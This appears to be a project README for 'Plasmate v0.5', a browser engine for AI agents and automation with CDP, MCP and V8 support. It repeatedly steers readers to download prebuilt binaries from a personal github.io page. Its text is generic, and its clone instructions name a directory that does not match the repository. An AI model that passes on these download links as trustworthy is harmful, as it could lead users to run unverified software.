# Plasmate v0.5 - browser engine 2026

> **Plasmate is a cross-platform browser engine for AI agents and automation workflows. In version 0.5, it converts HTML into a Semantic Object Model while providing CDP compatibility, V8 execution, and token-compressed output.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mattcarter1996/plasmate-v05-cdp?style=flat-square)](https://github.com/mattcarter1996/plasmate-v05-cdp)

---

<p align="center">
  <a href="https://mattcarter1996.github.io/plasmate-v05-cdp/">
    <img src="https://img.shields.io/badge/Download-Plasmate%20Latest-brightgreen?style=for-the-badge" alt="Download Plasmate">
  </a>
</p>

> **[Direct Download - Plasmate v0.5](https://mattcarter1996.github.io/plasmate-v05-cdp/)**

---

[Download Latest Build](https://mattcarter1996.github.io/plasmate-v05-cdp/)

---

## Overview

Plasmate is aimed at agentic browsing scenarios where a standard web page needs to be turned into data that software can reason about more easily. Its core job is to reshape HTML into a Semantic Object Model, giving downstream automation a cleaner structure to work with instead of starting from raw markup.

That makes it a practical fit for scraping, browser automation, and LLM-powered pipelines that depend on page state, DOM interaction, and compact representations of content. With CDP-style connectivity, MCP support, and Puppeteer-friendly workflows, it can slot into established automation setups while exposing a more semantic model of the web.

---

## Capabilities

- HTML to SOM compilation for structured page interpretation
- Structured extraction of page content and interactive elements
- CDP-compatible server for browser automation integrations
- Native AWP protocol support for agent-oriented workflows
- MCP tool server for model-context-driven usage
- JavaScript execution through V8 for dynamic page handling
- Puppeteer compatibility for familiar automation patterns
- Token-compressed output to reduce context overhead
- Proxy support for network-aware browsing setups

---

## Getting Started

You can either clone the source or fetch the newest build, then open it in the environment you normally use.

    git clone https://github.com/mattcarter1996/plasmate-v05-cdp.git
    cd plasmate

For packaged releases, download the build from the project page and launch the binary or app entry point appropriate for your system.

---

## How to Use It

Plasmate is intended to operate as the layer between a browser page and an automation consumer.

A common flow looks like this:

1. Start the browser engine or server.
2. Connect through CDP, MCP, or a Puppeteer-compatible client.
3. Load a page and let Plasmate compile the HTML into SOM.
4. Inspect structured elements, interact with IDs, or run JavaScript through V8.
5. Use the compressed output when feeding page state into an agent or scraper.

Example workflow:

    plasmate --serve
    connect via CDP or MCP client
    load target page
    extract structured data
    continue automation

---

## Configuration

Exact configuration depends on your launch path, but the usual options center on browser connection details, protocol choice, and proxy settings.

Example layout:

    {
      "protocol": "cdp",
      "proxy": "http://127.0.0.1:8080",
      "output": "som",
      "compression": "token-compressed"
    }

When connecting through MCP or CDP, make sure the endpoint values match the client you are using with the engine.

---

## Requirements

- Cross-platform environment
- Rust-based build or runtime setup where applicable
- V8 support for JavaScript execution
- Network access for web browsing and scraping tasks
- Enough memory and storage for browser sessions and extracted page data
- A compatible client if you plan to use CDP, Puppeteer, or MCP

---

## FAQ

### How do I connect to Plasmate?
Pick the protocol that matches your setup, whether that is CDP, MCP, or a Puppeteer-compatible client.

### Does it support automation and scraping?
Yes. Plasmate is built around browser automation, structured extraction, and agent-focused browsing tasks.

### Where are settings changed?
Depending on your deployment, configuration is usually handled through launch arguments or a local config file.

### What if a page depends on JavaScript?
Plasmate includes V8 execution, which helps when pages need client-side rendering or scripted interaction.

### How do I get updates?
Use the download link above for the newest build, or sync the latest repository changes before building from source.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
